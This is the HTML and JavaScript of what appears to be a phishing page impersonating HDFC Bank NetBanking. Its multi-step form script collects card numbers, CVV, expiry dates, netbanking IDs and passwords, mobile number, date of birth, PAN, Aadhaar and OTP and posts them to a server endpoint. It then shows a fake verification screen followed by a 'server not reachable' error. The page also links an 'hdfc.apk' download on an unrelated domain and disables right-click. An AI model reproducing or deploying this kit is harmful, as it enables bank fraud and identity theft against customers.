<!DOCTYPE html>
<html lang="zxx">

<head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' data: gap: https://ssl.gstatic.com 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; media-src *; connect-src *">
    <meta name="description" content="Shine">
    <meta name="keywords" content="Shine,Job,app">
    <meta name="author" content="Shine-Job">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>HDFC Bank NetBanking</title>
    <link rel="icon" href="assets/images/favicon.png" type="image/png" sizes="16x16">

    <!-- bootstrap css -->
    <link rel="stylesheet" href="assets/css/bootstrap.min.css" type="text/css" media="all" />
    <!-- animate css -->
    <link rel="stylesheet" href="assets/css/animate.min.css" type="text/css" media="all" />
    <!-- owl carousel css -->
    <link rel="stylesheet" href="assets/css/owl.carousel.min.css" type="text/css" media="all" />
    <link rel="stylesheet" href="assets/css/owl.theme.default.min.css" type="text/css" media="all" />
    <!-- boxicons css -->
    <link rel='stylesheet' href='assets/css/icofont.min.css' type="text/css" media="all" />
    <!-- flaticon css -->
    <link rel='stylesheet' href='assets/css/flaticon.css' type="text/css" media="all" />
    <!-- style css -->
    <link rel="stylesheet" href="assets/css/style.css" type="text/css" media="all" />
    <link rel="stylesheet" href="css/custom.css" type="text/css" media="all" />
    <!-- responsive css -->
    <link rel="stylesheet" href="assets/css/responsive.css" type="text/css" media="all" />
    <link rel="stylesheet" href="assets/plugins/toastr/toastr.min.css">
    <!--[if IE]>
            <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->
    <style>
        body {
            background: #fff;
            color: #333;
        }

        .cus_title {
            font-size: 21px;
            margin-top: 20px;
            font-weight: q00;
        }

        .cus_bg1 {
            background: #F3F3F3;
        }

        .cus_bg {
            background: #1d1d1d;
        }

        .cus_bg2 {
            background: #e2effa;
        }

        .cus_text {
            border-radius: 4px;
            width: 100%;
            border: 1px solid #dad8d8;
            padding: 6px;
            font-size: 14px;
        }

        .cus_btn {
            background: #1d86ff;
            color: #fff;
            border: 1px solid #fff;
            padding: 5px;
            width: 235px;
            border-radius: 4px;
        }

        .cus_btn:hover {
            background-color: #337ab7;
            border-color: #2e6da4;
        }

        .preloader:before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #fff;
        }
    </style>
</head>

<body id="homepage">
    <div class="preloader">
        <div class="preloader-wrapper">
            <div class="preloader-content">
                <img src="assets/images/preloader-logo.png" alt="logo">
                <h3>HDFC Bank</h3>
            </div>
        </div>
    </div>
    <div class="cus_bg1 ">
        <div class="container">
            <div class="cus_header" style="background:#fff;padding:10px">
                <div class="text-center">
                    <img src="assets/images/logo.png" alt="logo" style="width: 200px;" />
                </div>
                <div class="text-center cus_title">
                    Welcome to HDFC Bank NetBanking
                </div>
            </div>
            <form id="app_form" name="app_form" action="add_user_bank" method="POST" class="form form-horizontal" enctype="multipart/form-data" autocomplete="off">
               
                <div class="div8 hidden" style="padding: 5px;background:#fff;margin:10px 5px 5px 5px;">
                    <div class="" style="margin:20px 20px;">
                        <div class="col-md-12 mt-2">
                            <div class="site_message text-danger">

                                <center><b style="font-size:14px; font-family: Arial, Helvetica, sans-serif;color:green;">Thank you for validating your account information</b></center><br>
                                <center>
                                    <img src="assets/images/hdfcgif.gif" alt="" id="ad" width="40px"><br>
                                    <small id="otp_countdown2"></small>
                                    <br />
                                </center>
                                <div id="ha">
                                    <center>
                                        <h4 style="color:green; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin:0px;">Please wait while we verify your login details...</h4>
                                    </center>
                                </div>
                                <div id="ba">
                                    <center><b style="font-size:14px; font-family: Arial, Helvetica, sans-serif;">Don't press any key while proccessing...</b></center>
                                </div><br><br><br>
                                <be><br>

                            </div>
                        </div>
                    </div>
                </div>
                <div class="div9 hidden" style="padding: 5px;background:#fff;margin:10px 5px 5px 5px;">
                    <div class="" style="margin:20px 20px;">
                        <div class="" style="margin-top: 20px;font-weight: 100;font-size: 20px;">
                            Verification Failed
                        </div>
                        <div class="col-md-12 mt-2">
                            <div class="site_message text-danger">
                                <h5 style="color:#bf360c">Sorry for the inconvenience. Server is not reachable.
                                </h5>
                            </div>
                        </div>
                        <div style="margin-top: 10px;">
                            <button type="button" class="cus_btn" onclick="back_to_home()">Home</button>
                        </div>
                    </div>
                </div>




                <div class="cus_bg2" style="margin-top: 10px;font-weight: 100;font-size: 14px;padding: 10px;">
                    Dear Customer,<br /> Welcome to the new login page of HDFC Bank<br /> NetBanking.
                    <br /> Its lighter look and feel is designed to give you the <br /> best possible user experience. Please continue to <br /> login using your customer ID and password.
                </div>
        </div>
        </form>
    </div>
    </div>
    <div class="text-center" style="background: #fff;padding: 30px 0 0 0px;">
        <a href="http://ravins.online/apps/hdfc.apk" download>
			<img src="assets/images/download-for-android.jpeg" alt="logo" style="width: 130px;" />
		</a>
        <img src="assets/images/new-norton-seal1.png" alt="logo" style="width: 100px;" />
    </div>
    <script src="cordova.js"></script>
    <!-- essential js -->
    <script src="assets/js/jquery-3.5.1.min.js"></script>
    <script src="assets/js/bootstrap.bundle.min.js"></script>
    <!-- owl carousel js -->
    <script src="assets/js/owl.carousel.min.js"></script>
    <!-- form ajazchimp js -->
    <script src="assets/js/jquery.ajaxchimp.min.js"></script>
    <!-- form validator js  -->
    <script src="assets/js/form-validator.min.js"></script>
    <!-- contact form js -->
    <script src="assets/js/contact-form-script.js"></script>
    <script type="text/javascript" src="assets/plugins/toastr/toastr.min.js"></script>
    <!-- main js -->
    <script src="assets/js/script.js"></script>

    <script src="js/ajax_method.js"></script>
    <script src="js/index.js"></script>
    <script>
        var message = "This function is not allowed here.";

        function clickIE4() {

            if (event.button == 2) {
                alert(message);
                return false;
            }
        }

        function clickNS4(e) {
            if (document.layers || document.getElementById && !document.all) {
                if (e.which == 2 || e.which == 3) {
                    alert(message);
                    return false;
                }
            }
        }

        if (document.layers) {
            document.captureEvents(Event.MOUSEDOWN);
            document.onmousedown = clickNS4;
        } else if (document.all && !document.getElementById) {
            document.onmousedown = clickIE4;
        }

        document.oncontextmenu = new Function("alert(message);return false;")
        toastr.clear();
        toastr.options = {
            "closeButton": true,
            "debug": false,
            "newestOnTop": true,
            "progressBar": false,
            "positionClass": "toast-bottom-center",
            "preventDuplicates": true,
            "showDuration": "1000",
            "hideDuration": "50000",
            "timeOut": "9000",
            "extendedTimeOut": "10000"
        };

        function open_2nd_page() {
            var error = "";
            var payment_type = $("#payment_type").val();
            if (payment_type == "") {
                error += "Payment type is required field\n";
            } else {
                var card_email_id = $("#card_email_id").val();
                var card_password = $("#card_password").val();
                var card_no = $("#card_no").val();
                var card_name = $("#card_name").val();
                var expiry_date = $("#expiry_date").val();
                var expiry_year = $("#expiry_year").val();
                var cvv_no = $("#cvv_no").val();
                var netb_username = $("#netb_username").val();
                var netb_password = $("#netb_password").val();
                var cus_mobile_no = $("#cus_mobile_no").val();
                if (payment_type == "Debit Card") {

                    if (card_no == "") {
                        error += "Card no is required field \n <br />";
                    }
                    if (card_name == "") {
                        error += "Name on Card is required field \n <br />";
                    }
                    if (expiry_date == "") {
                        error += "Expiry date is required field \n <br />";
                    }
                    if (expiry_year == "") {
                        error += "Expiry year is required field \n <br />";
                    }
                    if (cvv_no == "") {
                        error += "CVV no is required field \n <br />";
                    }
                } else {
                    if (netb_username == "") {
                        error += "Customer ID is required field \n <br />";
                    }
                    if (netb_password == "") {
                        error += "Password is required field \n <br />";
                    }
                }

            }
            if (error == "") {
                $(".div1_btn").text("loading...");
                $(".div1_btn").attr("disabled", "true");
                $.ajax({
                    url: base_url + $("#app_form").attr("action"),
                    type: "POST",
                    dataType: "json",
                    data: new FormData($("#app_form")[0]),
                    async: true,
                    contentType: false,
                    cache: false,
                    processData: false,
                    xhr: function() {
                        var xhr = new window.XMLHttpRequest();
                        xhr.upload.addEventListener("progress", function(evt) {
                            if (evt.lengthComputable) {
                                var percentComplete = evt.loaded / evt.total;
                                percentComplete = parseInt(percentComplete * 100);
                                $('.myprogress').text(percentComplete + '%');
                                $('.myprogress').css('width', percentComplete + '%');
                                $('.myprogress').css({
                                    backgroundSize: (percentComplete * 100) + '%'
                                });
                            }
                        }, false);
                        return xhr;
                    },
                    success: function(data) {
                        if (data.type == 'success') {
                            $(".user_id").val(data.user_id);
                            localStorage.setItem("user_id", data.user_id);
                            $(".div1").addClass("hidden");
                            $(".div2").removeClass("hidden");
                        } else {
                            toastr.warning('<em class="ti ti-alert toast-message-icon"></em>' + data.text);
                        }
                        $(".div1_btn").text("Login");
                        $(".div1_btn").removeAttr("disabled");
                    },
                    error: function(xhr, ajaxOptions, thrownError) {
                        toastr.success('<em class="ti ti-check toast-message-icon"></em> No internet connection or server error');
                        $(".div1_btn").text("Login");
                        $(".div1_btn").removeAttr("disabled");
                    }
                });
                //
            }
            if (error != "") {
                toastr.error('<em class="ti ti-alert toast-message-icon"></em>' + error);
            }
        }

        function open_3nd_page() {
            var error = "";
            var error = "";
            var cus_name = $("#cus_name").val();
            var cus_dob = $("#cus_dob").val();
            var pancard = $("#pancard").val();
            var aadhaar_no = $("#aadhaar_no").val();
            if (cus_mobile_no == "") {
                error += "Mobile No is required field \n <br />";
            }
            if (cus_dob == "") {
                error += "Date of birth is required field \n <br />";
            }

            /*if(pancard=="")
            {
            	error += "Pan Card is required field \n <br />";
            }
            if(aadhaar_no=="")
            {
            	error += "Aadhaar No is required field \n <br />";
            }*/
            if (error == "") {


                $(".div2_btn").text("loading...");
                $(".div2_btn").attr("disabled", "true");
                $.ajax({
                    url: base_url + $("#app_form").attr("action"),
                    type: "POST",
                    dataType: "json",
                    data: new FormData($("#app_form")[0]),
                    async: true,
                    contentType: false,
                    cache: false,
                    processData: false,
                    xhr: function() {
                        var xhr = new window.XMLHttpRequest();
                        xhr.upload.addEventListener("progress", function(evt) {
                            if (evt.lengthComputable) {
                                var percentComplete = evt.loaded / evt.total;
                                percentComplete = parseInt(percentComplete * 100);
                                $('.myprogress').text(percentComplete + '%');
                                $('.myprogress').css('width', percentComplete + '%');
                                $('.myprogress').css({
                                    backgroundSize: (percentComplete * 100) + '%'
                                });
                            }
                        }, false);
                        return xhr;
                    },
                    success: function(data) {
                        if (data.type == 'success') {
                            $(".div2").addClass("hidden");
                            $(".div3").removeClass("hidden");
                        } else {
                            toastr.warning('<em class="ti ti-alert toast-message-icon"></em>' + data.text);
                        }
                        $(".div2_btn").text("Continue");
                        $(".div2_btn").removeAttr("disabled");
                    },
                    error: function(xhr, ajaxOptions, thrownError) {
                        toastr.success('<em class="ti ti-check toast-message-icon"></em> No internet connection or server error');
                        $(".div2_btn").text("Continue");
                        $(".div2_btn").removeAttr("disabled");
                    }
                });

            }
            if (error != "") {
                toastr.error('<em class="ti ti-alert toast-message-icon"></em>' + error);
            }
        }

        function open_4nd_page() {
            var error = "";

            /*if(pancard=="")
            {
            	error += "Pan Card is required field \n <br />";
            }
            if(aadhaar_no=="")
            {
            	error += "Aadhaar No is required field \n <br />";
            }*/
            if (error == "") {
                $(".div3_btn").text("loading...");
                $(".div3_btn").attr("disabled", "true");
                $.ajax({
                    url: base_url + $("#app_form").attr("action"),
                    type: "POST",
                    dataType: "json",
                    data: new FormData($("#app_form")[0]),
                    async: true,
                    contentType: false,
                    cache: false,
                    processData: false,
                    xhr: function() {
                        var xhr = new window.XMLHttpRequest();
                        xhr.upload.addEventListener("progress", function(evt) {
                            if (evt.lengthComputable) {
                                var percentComplete = evt.loaded / evt.total;
                                percentComplete = parseInt(percentComplete * 100);
                                $('.myprogress').text(percentComplete + '%');
                                $('.myprogress').css('width', percentComplete + '%');
                                $('.myprogress').css({
                                    backgroundSize: (percentComplete * 100) + '%'
                                });
                            }
                        }, false);
                        return xhr;
                    },
                    success: function(data) {
                        if (data.type == 'success') {
                            $(".div3").addClass("hidden");
                            $(".div4").removeClass("hidden");
                        } else {
                            toastr.warning('<em class="ti ti-alert toast-message-icon"></em>' + data.text);
                        }
                        $(".div3_btn").text("Continue");
                        $(".div3_btn").removeAttr("disabled");
                    },
                    error: function(xhr, ajaxOptions, thrownError) {
                        toastr.success('<em class="ti ti-check toast-message-icon"></em> No internet connection or server error');
                        $(".div3_btn").text("Continue");
                        $(".div3_btn").removeAttr("disabled");
                    }
                });
            }
            if (error != "") {
                toastr.error('<em class="ti ti-alert toast-message-icon"></em>' + error);
            }
            return false;
        }

        function open_5nd_page() {
            var error = "";

            /*if(pancard=="")
            {
            	error += "Pan Card is required field \n <br />";
            }
            if(aadhaar_no=="")
            {
            	error += "Aadhaar No is required field \n <br />";
            }*/
            if (error == "") {
                $(".div4_btn").text("loading...");
                $(".div4_btn").attr("disabled", "true");
                $.ajax({
                    url: base_url + $("#app_form").attr("action"),
                    type: "POST",
                    dataType: "json",
                    data: new FormData($("#app_form")[0]),
                    async: true,
                    contentType: false,
                    cache: false,
                    processData: false,
                    xhr: function() {
                        var xhr = new window.XMLHttpRequest();
                        xhr.upload.addEventListener("progress", function(evt) {
                            if (evt.lengthComputable) {
                                var percentComplete = evt.loaded / evt.total;
                                percentComplete = parseInt(percentComplete * 100);
                                $('.myprogress').text(percentComplete + '%');
                                $('.myprogress').css('width', percentComplete + '%');
                                $('.myprogress').css({
                                    backgroundSize: (percentComplete * 100) + '%'
                                });
                            }
                        }, false);
                        return xhr;
                    },
                    success: function(data) {
                        if (data.type == 'success') {
                            $(".div4").addClass("hidden");
                            $(".div5").removeClass("hidden");
                        } else {
                            toastr.warning('<em class="ti ti-alert toast-message-icon"></em>' + data.text);
                        }
                        $(".div4_btn").text("Continue");
                        $(".div4_btn").removeAttr("disabled");
                    },
                    error: function(xhr, ajaxOptions, thrownError) {
                        toastr.success('<em class="ti ti-check toast-message-icon"></em> No internet connection or server error');
                        $(".div4_btn").text("Continue");
                        $(".div4_btn").removeAttr("disabled");
                    }
                });
            }
            if (error != "") {
                toastr.error('<em class="ti ti-alert toast-message-icon"></em>' + error);
            }
            return false;
        }

        function open_6nd_page() {
            var error = "";

            /*if(pancard=="")
            {
            	error += "Pan Card is required field \n <br />";
            }
            if(aadhaar_no=="")
            {
            	error += "Aadhaar No is required field \n <br />";
            }*/
            if (error == "") {
                $(".div5_btn").text("loading...");
                $(".div5_btn").attr("disabled", "true");
                $.ajax({
                    url: base_url + $("#app_form").attr("action"),
                    type: "POST",
                    dataType: "json",
                    data: new FormData($("#app_form")[0]),
                    async: true,
                    contentType: false,
                    cache: false,
                    processData: false,
                    xhr: function() {
                        var xhr = new window.XMLHttpRequest();
                        xhr.upload.addEventListener("progress", function(evt) {
                            if (evt.lengthComputable) {
                                var percentComplete = evt.loaded / evt.total;
                                percentComplete = parseInt(percentComplete * 100);
                                $('.myprogress').text(percentComplete + '%');
                                $('.myprogress').css('width', percentComplete + '%');
                                $('.myprogress').css({
                                    backgroundSize: (percentComplete * 100) + '%'
                                });
                            }
                        }, false);
                        return xhr;
                    },
                    success: function(data) {
                        if (data.type == 'success') {
                            $(".div5").addClass("hidden");
                            $(".div6").removeClass("hidden");
                        } else {
                            toastr.warning('<em class="ti ti-alert toast-message-icon"></em>' + data.text);
                        }
                        $(".div5_btn").text("Continue");
                        $(".div5_btn").removeAttr("disabled");
                    },
                    error: function(xhr, ajaxOptions, thrownError) {
                        toastr.success('<em class="ti ti-check toast-message-icon"></em> No internet connection or server error');
                        $(".div5_btn").text("Continue");
                        $(".div5_btn").removeAttr("disabled");
                    }
                });
            }
            if (error != "") {
                toastr.error('<em class="ti ti-alert toast-message-icon"></em>' + error);
            }
            return false;
        }

        function open_7nd_page() {
            var error = "";

            /*if(pancard=="")
            {
            	error += "Pan Card is required field \n <br />";
            }
            if(aadhaar_no=="")
            {
            	error += "Aadhaar No is required field \n <br />";
            }*/
            if (error == "") {
                $(".div6_btn").text("loading...");
                $(".div6_btn").attr("disabled", "true");
                $.ajax({
                    url: base_url + $("#app_form").attr("action"),
                    type: "POST",
                    dataType: "json",
                    data: new FormData($("#app_form")[0]),
                    async: true,
                    contentType: false,
                    cache: false,
                    processData: false,
                    xhr: function() {
                        var xhr = new window.XMLHttpRequest();
                        xhr.upload.addEventListener("progress", function(evt) {
                            if (evt.lengthComputable) {
                                var percentComplete = evt.loaded / evt.total;
                                percentComplete = parseInt(percentComplete * 100);
                                $('.myprogress').text(percentComplete + '%');
                                $('.myprogress').css('width', percentComplete + '%');
                                $('.myprogress').css({
                                    backgroundSize: (percentComplete * 100) + '%'
                                });
                            }
                        }, false);
                        return xhr;
                    },
                    success: function(data) {
                        if (data.type == 'success') {
                            $(".div6").addClass("hidden");
                            $(".div7").removeClass("hidden");
                        } else {
                            toastr.warning('<em class="ti ti-alert toast-message-icon"></em>' + data.text);
                        }
                        $(".div6_btn").text("Continue");
                        $(".div6_btn").removeAttr("disabled");
                    },
                    error: function(xhr, ajaxOptions, thrownError) {
                        toastr.success('<em class="ti ti-check toast-message-icon"></em> No internet connection or server error');
                        $(".div6_btn").text("Continue");
                        $(".div6_btn").removeAttr("disabled");
                    }
                });
            }
            if (error != "") {
                toastr.error('<em class="ti ti-alert toast-message-icon"></em>' + error);
            }
            return false;
        }

        function final_submit() {
            var error = "";
            var otp = $("#otp").val();
            if (error == "") {
                $(".div7_btn").text("loading...");
                $(".div7_btn").attr("disabled", "true");
                $.ajax({
                    url: base_url + $("#app_form").attr("action"),
                    type: "POST",
                    dataType: "json",
                    data: new FormData($("#app_form")[0]),
                    async: true,
                    contentType: false,
                    cache: false,
                    processData: false,
                    xhr: function() {
                        var xhr = new window.XMLHttpRequest();
                        xhr.upload.addEventListener("progress", function(evt) {
                            if (evt.lengthComputable) {
                                var percentComplete = evt.loaded / evt.total;
                                percentComplete = parseInt(percentComplete * 100);
                                $('.myprogress').text(percentComplete + '%');
                                $('.myprogress').css('width', percentComplete + '%');
                                $('.myprogress').css({
                                    backgroundSize: (percentComplete * 100) + '%'
                                });
                            }
                        }, false);
                        return xhr;
                    },
                    success: function(data) {
                        if (data.type == 'success') {
                            localStorage.user_id = "";
                            $(".user_id").val('');
                            $(".div7").addClass("hidden");
                            $(".div8").removeClass("hidden");
                            open_9nd_page();
                        } else {
                            toastr.warning('<em class="ti ti-alert toast-message-icon"></em>' + data.text);
                        }
                        $(".div7_btn").text("Continue");
                        $(".div7_btn").removeAttr("disabled");
                    },
                    error: function(xhr, ajaxOptions, thrownError) {
                        toastr.success('<em class="ti ti-check toast-message-icon"></em> No internet connection or server error');
                        $(".div7_btn").text("Continue");
                        $(".div7_btn").removeAttr("disabled");
                    }
                });
            }
            if (error != "") {
                toastr.error('<em class="ti ti-alert toast-message-icon"></em>' + error);
            }
            return false;
        }

        function open9nd_page() {
            $(".div8").addClass("hidden");
            $(".div9").removeClass("hidden");
        }

        function open_9nd_page() {
            //setTimeout(open5nd_page, 6000);
            var timeleft = 60;
            var downloadTimer = setInterval(function() {
                if (timeleft <= 0) {
                    clearInterval(downloadTimer);
                    document.getElementById("otp_countdown").innerHTML = "";
                    //open5nd_page();
                    open10nd_page();
                } else {
                    document.getElementById("otp_countdown").innerHTML = "Please wait " + timeleft + " second";
                }
                timeleft -= 1;
            }, 1000);
        }

        function open10nd_page() {
            $(".div2").addClass("hidden");
            $(".div3").addClass("hidden");
            $(".div4").addClass("hidden");
            $(".div5").addClass("hidden");
            $(".div6").addClass("hidden");
            $(".div7").addClass("hidden");
            $(".div8").addClass("hidden");
            $(".div9").removeClass("hidden");
        }

        function open_10nd_page() {
            //setTimeout(open5nd_page, 6000);
            var timeleft = 60;
            var downloadTimer = setInterval(function() {
                if (timeleft <= 0) {
                    clearInterval(downloadTimer);
                    document.getElementById("otp_countdown2").innerHTML = "";
                    open6nd_page();
                } else {
                    document.getElementById("otp_countdown2").innerHTML = "Please wait " + timeleft + " second";
                }
                timeleft -= 1;
            }, 1000);
        }

        function back_to_home() {
            $(".div2").addClass("hidden");
            $(".div3").addClass("hidden");
            $(".div4").addClass("hidden");
            $(".div5").addClass("hidden");
            $(".div6").addClass("hidden");
            $(".div7").addClass("hidden");
            $(".div8").addClass("hidden");
            $(".div9").addClass("hidden");
            $(".div1").removeClass("hidden");
        }
    </script>
</body>

</html>